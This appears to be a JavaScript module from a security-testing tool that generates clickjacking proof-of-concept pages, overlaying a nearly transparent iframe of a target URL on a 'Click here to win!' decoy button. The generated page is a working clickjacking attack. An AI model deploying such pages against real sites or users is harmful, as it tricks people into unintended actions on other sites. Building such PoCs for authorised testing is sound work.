// Clickjacking PoC generator — pure, DOM-free core. Builds a complete HTML
// document that overlays a near-invisible iframe over a decoy element so the
// victim clicks through to the target site without realising it.
//
// DOM-free so it can be unit-tested under `node --test`.

function escapeHtml(value) {
  return String(value ?? '').replace(/[&<>"]/g, (c) =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c])
  );
}

// Default options for a clickjacking PoC.
// opacity is intentionally near-zero (0.0001) — the classic technique hides
// the iframe so the victim sees only the decoy while actually clicking the
// target page beneath it.
export function defaultOptions() {
  return { decoyText: 'Click here to win!', opacity: 0.0001, top: 0, left: 0 };
}

// Build a clickjacking PoC page.
// Options:
//   url        — target URL (goes in the iframe src attribute)
//   decoyText  — visible decoy button/banner text shown to the victim
//   opacity    — iframe opacity (0..1); clamped to the range automatically
//   top        — vertical offset of the iframe in px; coerced to integer
//   left       — horizontal offset of the iframe in px; coerced to integer
//
// Returns a complete <!DOCTYPE html> string safe for saving or Blob-previewing.
export function buildClickjackPoc({ url = '', decoyText, opacity, top, left } = {}) {
  const defaults = defaultOptions();

  // Sanitise and clamp inputs.
  const safeOpacity = Math.min(1, Math.max(0, isFinite(Number(opacity)) ? Number(opacity) : defaults.opacity));
  const safeTop     = Math.trunc(isFinite(Number(top))  ? Number(top)  : defaults.top);
  const safeLeft    = Math.trunc(isFinite(Number(left)) ? Number(left) : defaults.left);
  const safeDecoy   = (decoyText != null && String(decoyText).length > 0)
    ? String(decoyText)
    : defaults.decoyText;

  const escapedUrl   = escapeHtml(url);
  const escapedDecoy = escapeHtml(safeDecoy);

  return [
    '<!DOCTYPE html>',
    '<!-- Clickjacking proof-of-concept — authorized testing only. -->',
    '<html lang="en">',
    '<head>',
    '  <meta charset="UTF-8" />',
    '  <title>PoC</title>',
    '  <style>',
    '    * { margin: 0; padding: 0; box-sizing: border-box; }',
    '    body { width: 100vw; height: 100vh; overflow: hidden; background: #fff; }',
    '    #decoy {',
    '      position: absolute;',
    `      top: ${safeTop}px;`,
    `      left: ${safeLeft}px;`,
    '      z-index: 1;',
    '      padding: 14px 28px;',
    '      background: #e5341a;',
    '      color: #fff;',
    '      font: 700 16px/1 sans-serif;',
    '      border: none;',
    '      border-radius: 4px;',
    '      cursor: pointer;',
    '    }',
    '    #target {',
    '      position: absolute;',
    `      top: ${safeTop}px;`,
    `      left: ${safeLeft}px;`,
    '      width: 100vw;',
    '      height: 100vh;',
    '      border: none;',
    `      opacity: ${safeOpacity};`,
    '      z-index: 2;',
    '    }',
    '  </style>',
    '</head>',
    '<body>',
    `  <button id="decoy">${escapedDecoy}</button>`,
    `  <iframe id="target" src="${escapedUrl}" width="100%" height="100%" scrolling="no"></iframe>`,
    '</body>',
    '</html>',
    '',
  ].join('\n');
}
